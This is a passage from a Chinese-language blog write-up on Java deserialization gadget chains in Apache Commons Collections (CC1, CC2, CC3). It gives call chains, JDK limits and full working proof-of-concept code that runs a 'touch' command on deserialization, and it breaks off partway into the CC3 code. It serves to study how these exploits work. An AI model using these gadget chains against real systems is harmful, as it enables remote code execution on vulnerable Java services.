      <p>有一个和<code>Transformer</code>接口很像的类<code>InvocationHandler</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Throwable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>当该代理对象调用任意方法时，都会被替换为调用之前传入的实现了<code>InvocationHandler</code>类下重写的<code>invoke</code>方法，以下是个简单的例子。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//声明一个实现了InvocationHandler接口的类</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> Map map;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">(Map map)</span></span>&#123;</span><br><span class="line">                <span class="keyword">this</span>.map = map;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Calling invoke....&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Hook method: &quot;</span> + method.getName());</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Hacked return string&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.map,args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler = <span class="keyword">new</span> Demo(<span class="keyword">new</span> HashMap());</span><br><span class="line">        <span class="comment">//代理时传入实现了InvocationHandler接口的类的实例对象,返回代理对象proxyMap</span></span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line">        <span class="comment">//当代理对象proxyMap调用任意方法时,都会被之前传入的实现了</span></span><br><span class="line">        <span class="comment">//InvocationHandler接口的类下重写的invoke方法给替换掉</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//比如这里的put和get都会被Demo.invoke给替换掉</span></span><br><span class="line">        proxyMap.put(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        String result = (String) proxyMap.get(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>那么就有希望调用到某个类的<code>invoke</code>函数了，这里的<code>CC1</code>即选取的尝试调用<code>AnnotationInvocationHandler.invoke()</code></p>

        <h2 id="JAVA源码版本-8u40"   >
          <a href="#JAVA源码版本-8u40" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803181047725.png" alt="image-20220803181047725"></p>
<p>细节如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制"   >
          <a href="#限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：<code>8u71</code>及以前版本，原因是在<code>8u71</code>之后的版本中<code>sun.reflect.annotation.AnnotationInvocationHandler.readObject()</code>函数发生了变化。</p>

        <h2 id="POC"   >
          <a href="#POC" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                   <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch aaaaa&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap) LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个与代理对象相关联的InvocationHandler map_handler</span></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建代理对象proxy_map来代理map_handler，代理对象执行的所有方法都会替换执行InvocationHandler中的invoke方法</span></span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,map_handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//再创建一个AnnotationInvocationHandler对象，用来触发代理对象proxy_map的方法执行,从而跳转AnnotationInvocationHandler.voker()</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler)handler_constructor.newInstance(Override.class,proxy_map);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc1&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc1&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-2"   >
          <a href="#解析-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-2" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="AnnotationInvocationHandler-readObject"   >
          <a href="#AnnotationInvocationHandler-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#AnnotationInvocationHandler-readObject" class="headerlink" title="AnnotationInvocationHandler.readObject()"></a><code>AnnotationInvocationHandler.readObject()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803201921921.png" alt="image-20220803201921921"></p>

        <h3 id="AnnotationInvocationHandler-invoke"   >
          <a href="#AnnotationInvocationHandler-invoke" class="heading-link"><i class="fas fa-link"></i></a><a href="#AnnotationInvocationHandler-invoke" class="headerlink" title="AnnotationInvocationHandler.invoke()"></a><code>AnnotationInvocationHandler.invoke()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803203105622.png" alt="image-20220803203105622"></p>

        <h3 id="LazyMap-get"   >
          <a href="#LazyMap-get" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-get" class="headerlink" title="LazyMap.get()"></a><code>LazyMap.get()</code></h3>
      <p>还是经典的链子<code>CIR</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png" alt="image-20220801110714702"></p>

        <h1 id="二、CC2"   >
          <a href="#二、CC2" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、CC2" class="headerlink" title="二、CC2"></a>二、CC2</h1>
      
        <h2 id="JAVA源码版本-8u40-1"   >
          <a href="#JAVA源码版本-8u40-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-1" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805162929023.png" alt="image-20220805162929023"></p>
<p>细节如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()-&gt;heapify()-&gt;siftDown()-&gt;siftDownUsingComparator()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Templateslmpl.newTransfomer()</span><br></pre></td></tr></table></div></figure>

<p><code>PriorityQueue</code>在<code>commons-collections4</code>下才开始有</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-1"   >
          <a href="#限制-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-1" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无</p>

        <h2 id="POC-1"   >
          <a href="#POC-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构建字节码</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;touch aaaa\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setField(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>)</span><br><span class="line">                .getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> Object[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        setField(queue,<span class="string">&quot;queue&quot;</span>,queue_array);</span><br><span class="line">        setField(queue,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置comparator为TransformingComparator,进入siftDownUsingComparator</span></span><br><span class="line">        setField(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc2&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc2&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-3"   >
          <a href="#解析-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-3" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="PriorityQueue-readObject"   >
          <a href="#PriorityQueue-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue.readObject()"></a><code>PriorityQueue.readObject()</code></h3>
      <p>这里同理需要看一下<code>writeObject</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805165712958.png" alt="image-20220805165712958"></p>
<p>也是对应读写的，所以可以利用反射设置<code>PriorityQueue</code>的<code>queue</code>，使其可控，然后进入下面的<code>heapify()</code>函数</p>

        <h3 id="PriorityQueue-heapify"   >
          <a href="#PriorityQueue-heapify" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue-heapify" class="headerlink" title="PriorityQueue.heapify()"></a><code>PriorityQueue.heapify()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170040301.png" alt="image-20220805170040301"></p>
<p>再进入<code>siftDown</code></p>

        <h3 id="PriorityQueue-siftDown"   >
          <a href="#PriorityQueue-siftDown" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue-siftDown" class="headerlink" title="PriorityQueue.siftDown()"></a><code>PriorityQueue.siftDown()</code></h3>
      <p>其中<code>comparator</code>利用反射设置为<code>TransformingComparator</code>，随后进入<code>siftDownUsingComparator</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170115164.png" alt="image-20220805170115164"></p>

        <h3 id="PriorityQueue-siftDownUsingComparator"   >
          <a href="#PriorityQueue-siftDownUsingComparator" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue-siftDownUsingComparator" class="headerlink" title="PriorityQueue.siftDownUsingComparator()"></a><code>PriorityQueue.siftDownUsingComparator()</code></h3>
      <p>调用到实现了<code>Comparator</code>接口的<code>TransformingComparator.comparator()</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170501655.png" alt="image-20220805170501655"></p>

        <h3 id="TransformingComparator-comparator"   >
          <a href="#TransformingComparator-comparator" class="heading-link"><i class="fas fa-link"></i></a><a href="#TransformingComparator-comparator" class="headerlink" title="TransformingComparator.comparator()"></a><code>TransformingComparator.comparator()</code></h3>
      <p>那么之前利用反射设置了<code>TransformingComparator.transformer</code>为<code>InvokerTransformer</code>，那么就可以调用到<code>InvokerTransformer.transoform</code>，并且其参数即为这里的<code>obj1</code>，也为<code>PriorityQueue.queue</code>，这个之前设置为了<code>TemplatesImpl</code>，即最后可调用到经典链子<code>ITN</code>，完成利用。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805170750082.png" alt="image-20220805170750082"></p>

        <h1 id="三、CC3"   >
          <a href="#三、CC3" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、CC3" class="headerlink" title="三、CC3"></a>三、CC3</h1>
      
        <h2 id="JAVA源码版本-8u40-2"   >
          <a href="#JAVA源码版本-8u40-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-2" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110944484.png" alt="image-20220806110944484"></p>
<p>细节如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br></pre></td></tr></table></div></figure>

<p>之后的链子就是经典<code>CITTN</code>链了</p>

        <h2 id="限制-2"   >
          <a href="#限制-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-2" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无</p>

        <h2 id="POC-2"   >
          <a href="#POC-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> 